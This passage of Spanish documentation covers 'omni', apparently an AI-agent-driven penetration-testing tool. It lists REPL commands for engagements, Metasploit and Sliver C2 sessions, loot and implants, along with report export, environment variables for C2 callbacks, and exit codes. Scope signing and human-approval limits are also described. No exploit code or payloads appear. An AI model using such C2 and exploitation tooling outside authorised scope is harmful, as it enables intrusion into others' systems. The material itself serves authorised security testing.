El REPL (`omni`) sirve igual en manual: los comandos `/` **no** ejecutan tools
salvo los que lo declaran. Los más útiles cuando trabajas a mano:

| Comando | Qué hace |
|---|---|
| `/tools` | Lista tools durables con riesgo y si exigen scope. |
| `/scope` · `/engage_current` | Engagement activo. |
| `/engage_list` · `/engage_create` · `/engage_use` | Gestión de engagements. |
| `/findings` | Hallazgos verificados del engagement. |
| `/facts [tipo]` | Blackboard del engagement (memoria durable). |
| `/timeline [run]` | Cronología desde el audit trail. |
| `/history [n]` · `/history --archive` | Mensajes del run / sesiones de trabajo. |
| `/approvals` | Aprobaciones durables pendientes. |
| `/sessions [--sliver]` · `/session attach <uuid>` · `/detach` · `/kill-session` | Sesiones MSF/Sliver. |
| `/loot` · `/sliver` · `/implants` | C2 Sliver: loot (con SHA256), estado del server, builds/profiles. |
| `/playbook [show <id>]` | Playbooks aplicables y su siguiente paso. |
| `/plan [show]` · `/panel on\|off` | Plan por fases. |
| `/report`, `/report export <dir>`, `/report --llm-cvss`, `/report --format sarif` | Reporte. |
| `/review [--deliver] [--llm-cvss] [--format F]` | Validación de evidencia/integridad/limpieza. |
| `/trust [on\|off]` | Trust mode. |
| `/status [on\|off\|show\|fields ...]` | Barra de estado. |
| `/export [archivo]` | Exporta la sesión a Markdown. |
| `/clear` | Rota a una sesión de trabajo nueva. |

> El **listado completo de todos los comandos `/`** (incluidos `/ask`, `/mode`,
> `/subagent`, `/secrets`, `/roe`, `/skills`, `/interview`, `/exploit`, `/expand`,
> `/help`, `/exit`…) está documentado en **[GUIA_AGENTE_1.md](GUIA_AGENTE_1.md)**,
> porque son las instrucciones que dirigen al agente; aquí solo se han listado los
> de inspección manual.

---

## 11. Reportes manuales

El reporte lee el audit trail y los `ToolResult` persistidos y **nunca inventa un
hallazgo**. Formatos: **Markdown**, **HTML** autocontenido, **JSON** (consumo
programático) y **SARIF 2.1.0** (`--format sarif`).

```bash
omni report --format both --output ./entregable
omni report --format sarif --output ./ghas
```

Desde el REPL:

```text
/report
/report --llm-cvss
/report --format sarif
/report export ./entregable
```

`export` escribe el entregable más `report.sha256` y `manifest.json`. Cada
artefacto queda registrado con `sha256` (chain of custody). Si la cadena de
auditoría no valida, el reporte se genera igual pero se marca **NO VERIFICADA**.

---

## 12. Variables de entorno

| Variable | Efecto |
|---|---|
| `NEXUS_SCOPE_MODE` | `governed` (def.) o `lab` (acepta scopes sin firmar; **nunca** en producción). |
| `NEXUS_SCOPE_SIGNING_SECRET` | Secreto de firma HMAC del scope (y de las skills). |
| `NEXUS_SANDBOX_MODE` | `local` \| `local_strict` \| `oci` \| `oci_network` (no implementado). |
| `NEXUS_OCI_RUNTIME`, `NEXUS_SANDBOX_IMAGES` | Runtime/imágenes OCI. |
| `NEXUS_TOOL_BIN_DIR` | Directorio de binarios de usuario añadido al PATH del sandbox (def. `~/.local/bin`). |
| `NEXUS_DB_PATH`, `DATABASE_URL` | Backend de control store (SQLite/PostgreSQL). |
| `NEXUS_WORKSPACE_ROOT` | Workspace efectivo del engagement. |
| `NEXUS_NUCLEI_TEMPLATES` | Directorio de templates de nuclei. |
| `NEXUS_WORDLIST_DIRS`, `NEXUS_WORDLISTS` | Diccionarios disponibles. |
| `NEXUS_LLM_DEFAULT_PROVIDER`, `LLM_PROVIDER` | Selección de proveedor LLM (irrelevante en manual). |
| `NEXUS_LOG_LEVEL` | `debug`\|`info`\|`warning`(def.)\|`error`. |
| `NEXUS_NO_TUI`, `NEXUS_NO_ALT_SCREEN`, `NEXUS_NO_BANNER`, `NEXUS_NO_SPINNER` | Presentación. |
| `NEXUS_PREFLIGHT_BINARIES`, `NEXUS_ALLOW_DEGRADED_TOOLS` | Preflight de binarios antes de un run. |
| `NEXUS_RUN_BUDGET_TOKENS` | Presupuesto de tokens por run (0 = sin límite). |
| `NEXUS_OPERATOR_ID` | Identidad de operador (hooks/resume). |
| `MSF_RPC_URL`/`_USER`/`_PASSWORD`/`_TRANSPORT`, `MSF_LHOST`, `MSF_LPORT` | Metasploit RPC y callback. |
| `SLIVER_OPERATOR_CONFIG`, `SLIVER_LHOST`, `SLIVER_LPORT`, `SLIVER_TIMEOUT` | Sliver C2. |

---

## 13. Códigos de salida y límites

`omni run` publica `run.complete` con `termination_reason`,
`completion_verified`, `exit_code` y `exit_code_version: 1`:

| Código | Significado |
|---|---|
| `0` | `completed` **y** `completion_verified=true`. |
| `1` | Incompleto: `max_iterations`, `clarification`, `premature_completion`, final no verificado u otro fallo local. |
| `2` | Bloqueado esperando aprobación humana. |
| `3` | Fallo de proveedor LLM/RPC o timeout externo. |
| `4` | Denegación de gobernanza (scope, RoE, policy o sandbox inválido). |
| `130` | Interrupción SIGINT/cancelación. |

`omni tool` usa: `0` verificado · `1` denegado/fallido · `2` error de uso.

**Límites que debes tener presentes:**

- El sandbox `local_strict` **no** aísla red/procesos/filesystem del host.
- `LAB` de scope es para laboratorio; en producción usa siempre `governed`.
- Las tools de riesgo `DESTRUCTIVE` nunca se auto-aprueban, ni con trust mode.
- Los binarios externos se detectan pero no se instalan solos: `--setup --install`
  genera el plan y `--yes` lo aplica por el flujo aprobado.
